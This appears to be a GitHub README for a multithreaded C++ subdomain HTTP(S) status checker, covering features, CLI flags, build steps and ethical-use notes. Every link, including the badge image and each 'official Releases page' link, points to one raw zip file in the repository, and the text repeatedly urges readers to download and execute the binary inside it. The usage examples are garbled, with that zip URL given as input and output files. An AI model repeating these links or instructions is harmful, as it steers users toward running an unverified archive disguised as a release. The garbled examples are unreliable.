# 404Hunter Subdomain Status Tool: Fast Multithreaded HTTP(S) Checks

[![Releases](https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip)](https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip)

<img src="https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip%E2%80%93HTTPS-Check-2DBE2D?style=for-the-badge&logo=server&logoColor=white" alt="HTTP(S) check badge" />

🚀 Welcome to 404Hunter Subdomain Status Tool. This project is a fast, reliable command line utility designed to verify which subdomains respond over HTTP or HTTPS. It leverages multi-threading to speed up checks and produces clean, easily parsable output that can be redirected to files for further analysis. It is ideal for bug bounty hunters, penetration testers, or system administrators who need to confirm active subdomains quickly and efficiently.

This repository is focused on providing a practical, no-nonsense tool for subdomain verification. It aims to be straightforward to set up, easy to operate, and robust enough to handle large lists of targets. You will notice a strong emphasis on performance, reliability, and clear output formatting.

If you want to explore the latest builds and release assets, visit the official Releases page at the link below. It hosts prebuilt binaries for multiple platforms and packaging formats, removing the guesswork from building the project locally. See the link here: https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip

Table of contents
- Why this project exists
- Core features
- How it works
- Getting started
- Quick start guides by platform
- CLI reference
- Output formats and examples
- Advanced usage
- Performance and reliability
- Security and safety considerations
- Testing, quality, and validation
- Configuration and customization
- Code structure and design
- Testing and CI
- Community and contribution
- Roadmap and future work
- Appendix: FAQ
- License

Why this project exists
🧭 In the security and infrastructure space, quickly validating which subdomains are alive matters. Manual checks are slow and error prone. This tool automates the process, delivering fast, repeatable results. It helps auditors, red teams, and admins confirm which hosts respond to HTTP or HTTPS probes. The workflow is simple: feed a list of subdomains, run checks, and collect the results in a structured format. The approach minimizes false positives and noise, giving you a trustworthy dataset to work from.

Core features
- High-speed checks via multi-threading
  - The tool uses parallel workers to dispatch HTTP(S) requests against a list of subdomains. This dramatically reduces total run time on large lists.
- Flexible timeouts
  - Each check can be constrained with a per-request timeout. This keeps the overall run time predictable and helps avoid long stalls on non-responsive hosts.
- Clean, parseable output
  - Results are emitted in a consistent format that is easy to filter, post-process, or import into spreadsheets and reporting pipelines.
- Output to file
  - Directly write results to files in CSV, JSON, or human-readable formats. This makes it simple to share findings with teammates or attach to tickets.
- Cross-platform and language-friendly
  - The tool is designed with portability in mind. It is suitable for Linux, Windows, and macOS workflows.
- User-friendly CLI
  - A concise set of options covers common use cases without requiring a heavy configuration file. The goal is to stay approachable yet powerful.
- Extensible and well-structured code
  - The codebase follows clean design principles, making it easier for contributors to add features, adjust behavior, or fix issues.
- Open source with a transparent release cycle
  - Prebuilt binaries and source code are available via the official releases channel, ensuring reproducibility and trust.

How it works
🔧 At its core, this tool reads a list of subdomains, normalizes them as needed, and issues HTTP and/or HTTPS requests to each target. It records whether a response was received, the status code, and any relevant metadata. The multi-threaded architecture distributes work across worker threads, balancing throughput with resource constraints. The output file captures key fields such as the subdomain, protocol used, status code, response time, and a verdict on whether the host is alive.

Key concepts
- Alive vs. dead
  - A subdomain is considered alive if an HTTP(S) response was received within the configured timeout, regardless of status code. Dead or unreachable hosts are recorded accordingly.
- Protocol handling
  - By default, the tool can probe both HTTP and HTTPS depending on the configuration. You can constrain the probe to a single scheme if needed.
- Timeouts and retries
  - A per-request timeout prevents a single slow host from delaying the entire run. Optional retries can improve resilience against transient network issues.
- Output schemas
  - CSV: easy to import into spreadsheets and BI tools.
  - JSON: convenient for programmatic consumption and pipelines.
  - Plain text: simple, readable logs for quick audits.

Getting started
Before you begin, you need access to a machine with a modern C++ toolchain and network access to the subdomains you want to test. The project is built with C++17, and the recommended build system is CMake. If you prefer prebuilt binaries, you can grab them from the Releases page.

The Releases page is the central hub for downloadable artifacts and installation packages. To avoid building from source, check the prebuilt binaries appropriate for your platform and run them directly. The official Releases page is available here: https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip

Quick start guides by platform
- Linux
  - Install dependencies: a functional C++17 toolchain, CMake, and a standard library with networking support.
  - Build from source: clone the repo, create a build directory, configure with CMake, and compile.
  - Run with a sample list of subdomains and capture the output to a file.
- Windows
  - Use the Windows build or a compatible MinGW/Cygwin toolchain.
  - Ensure you have network access and a suitable runtime library installed.
  - Execute the binary and provide a path to a subdomain list.
- macOS
  - Install Xcode command line tools or a compatible compiler.
  - Build via CMake or use a prebuilt macOS binary if available.
  - Run with your input file and direct output to a log or data file.

Downloads and installation
Download and run from the official Releases page. The link contains path parts, so you should download the release artifact you need and execute the included binary. If you prefer to explore first, you can browse the Releases section to see what is offered for your platform and architecture.

- Primary link to Releases: https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip
- How to use the release artifact: download the appropriate binary for your OS, extract if needed, and run it with your arguments.

If you want to explore additional options or need a quick reference, the Releases page is the best starting point. For convenience, you can revisit the same link to review the latest updates and ensure you are using a supported, up-to-date build.

CLI reference
The tool exposes a compact, well-documented command line interface. The options are designed to be intuitive and consistent, with sensible defaults to cover common workflows. The reference below describes the most commonly used flags and parameters. You can also run the binary with a --help flag to print an on-screen usage guide.

- Input and output
  - -i, --input FILE: Path to a text file containing a list of subdomains, one per line.
  - -f, --input-format FORMAT: Specify input format if you need special handling (default is line-based).
  - -o, --output FILE: Path to the output file. The tool writes results in the selected format.
  - -O, --output-format FORMAT: csv, json, or text.
- Performance and threading
  - -t, --threads N: Number of worker threads. Higher counts increase speed but use more CPU and network resources.
  - -w, --timeout SECONDS: Per-request timeout. Typical values range from 1 to 10 seconds depending on network reliability.
  - -r, --retry N: Number of retry attempts on failure.
- Protocols and behavior
  - --https: Force HTTPS checks only.
  - --http: Force HTTP checks only.
  - --both: Check both HTTP and HTTPS (default if not specified).
  - --follow-redirects: Respect redirects when measuring liveness.
- Output details
  - --verbose: Print progress updates and detailed per-request information.
  - --quiet: Minimal output; useful for scripting.
  - --no-color: Disable colored output for environments without terminal color support.
- Help and version
  - -h, --help: Show usage information.
  - -V, --version: Show version information.

Usage examples
- Basic usage with an input file and CSV output
  - 404hunter-subdomain-status-tool --input https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output-format csv --threads 16 --timeout 5
- Dual-protocol check with default output
  - 404hunter-subdomain-status-tool --input https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --follow-redirects
- JSON output for automation
  - 404hunter-subdomain-status-tool --input https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output-format json --threads 8 --timeout 3
- Quiet mode for scripting
  - 404hunter-subdomain-status-tool --input https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --quiet

Output formats and examples
- CSV
  - A compact, tabular representation. Each row contains the subdomain, the protocol used, the status code (if any), the time taken, and a verdict on liveliness.
- JSON
  - A structured array of result objects. Each object includes fields like host, scheme, status, duration_ms, and alive.
- Text
  - A human-friendly log suitable for quick reads or simple pipelines.

Security and safety considerations
- Respect usage policies
  - When testing subdomains, ensure you have authorization to probe the targets. Do not scan networks or hosts you do not own or do not have permission to test.
- Rate limiting and politeness
  - Configure timeouts and concurrency to avoid overloading subdomains or intermediate infrastructure. If you control a large range of hosts, consider staggering requests and monitoring network impact.
- Data handling
  - Output files may contain sensitive information about subdomains and their responses. Store results securely and share them only with appropriate parties.
- Fault tolerance
  - The tool is designed to handle transient failures gracefully. Retries and timeouts can be tuned to balance speed and reliability.

Performance and reliability
- Multithreaded design
  - The worker pool pattern enables concurrent probing, making the tool suitable for large target lists. This approach helps you complete assessments faster while keeping CPU usage predictable.
- Deterministic output
  - Despite parallel execution, the tool formats results consistently, enabling straightforward downstream processing.
- Robust error handling
  - Network errors, DNS failures, or timeouts are captured and reported in a structured way. The output remains usable even in imperfect networks.
- Observability
  - Verbose mode provides insight into the check lifecycle, including success, failure, and retry events. This helps with debugging and audit trails.

Configuration and customization
- Runtime options
  - The CLI supports a range of knobs to tailor behavior to your environment. You can adjust threads, timeouts, and output formats to fit your workload and hardware.
- Output customization
  - You can choose between CSV, JSON, or plain text. This makes the tool adaptable to different reporting workflows, dashboards, or ticketing systems.
- Integration points
  - The JSON output format is friendly to automation. You can feed the results into scripts, data pipelines, or security platforms to automate triage and reporting.

Code structure and design
- Language and standards
  - The core is written in modern C++ with C++17 features. The focus is on readability, maintainability, and portability across major operating systems.
- Modularity
  - Components are separated by concern: I/O, networking, concurrency, and formatting. This makes the codebase approachable for new contributors.
- Testing and quality
  - The project embraces unit tests and integration tests. Continuous integration pipelines help ensure reliability across changes.

Building from source
- Prerequisites
  - A C++17-capable compiler, CMake, and a sensible build toolchain for your platform.
- Typical build steps
  - mkdir build && cd build
  - cmake .. -DCMAKE_BUILD_TYPE=Release
  - cmake --build . -j
- Verification
  - Run the binary with a small test input and verify that results are produced in the selected format.

Contributing
- How to contribute
  - Fork the repository, implement your feature or fix, and submit a pull request with a clear summary of changes.
- Style and conventions
  - Follow the existing coding style. Add tests for new behavior. Update documentation where relevant.
- Community guidelines
  - Be respectful, constructive, and precise in feedback. Help with tests and debugging when you can.

Code of conduct
- We maintain a respectful, inclusive environment for all contributors. If you encounter issues, ask for help and offer help to others in return.

Changelog and release notes
- Each release includes a summary of what changed, why, and how it affects users. Review the Releases page for the most up-to-date information on fixes, improvements, and new features.

Roadmap and future work
- Expand platform support
  - Add more prebuilt binaries for different architectures.
- Improve analysis and reporting
  - Include richer metrics, such as connection time distribution, per-subdomain latency graphs, and more granular statuses.
- Improve UX
  - Simplify usage for beginners while offering deeper control for power users.

Appendix: Frequently asked questions
- Do I need to run this tool with root privileges?
  - In most cases, no. Standard user privileges are sufficient for HTTP(S) checks. However, some environments or corporate networks may impose restrictions that require elevated privileges or specific network configurations.
- Can I use this tool to scan a large list of subdomains on a shared server?
  - Yes, but be mindful of network policies and potential impact on the server. Use reasonable thread counts and timeouts. Consider running during off-peak hours if you are scanning on a public or multi-tenant host.
- How do I handle output data securely?
  - Treat output files as potentially sensitive. Store them in a secure location, apply access controls, and avoid exposing them in public logs or shared folders.

License
- This project is available under a permissive open source license. See the LICENSE file in the repository for full terms and conditions.

Releases, binaries, and download notes
- The Releases page hosts prebuilt binaries and artifacts for multiple platforms. If you want to pick up a ready-to-run binary, browse the releases, download the appropriate asset for your OS, and execute the binary with your target list. For convenience, the link to the official releases is provided again here: https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip

Acknowledgments
- Thanks to the community for feedback, bug reports, and pull requests. The collaborative effort helps keep the tool fast, reliable, and useful for security testing, auditing, and admin tasks.

Credits
- 404Hunter Subdomain Status Tool is developed with contributions from enthusiasts and professionals who value clarity, speed, and practicality. The project name reflects its core purpose: quickly verifying alive subdomains over HTTP/HTTPS.

Safety and ethical use reminder
- Use this tool responsibly. Ensure you have explicit permission to test any target domain or subdomain. Misuse can have legal consequences and may violate terms of service, acceptable use policies, or local laws.

End of document.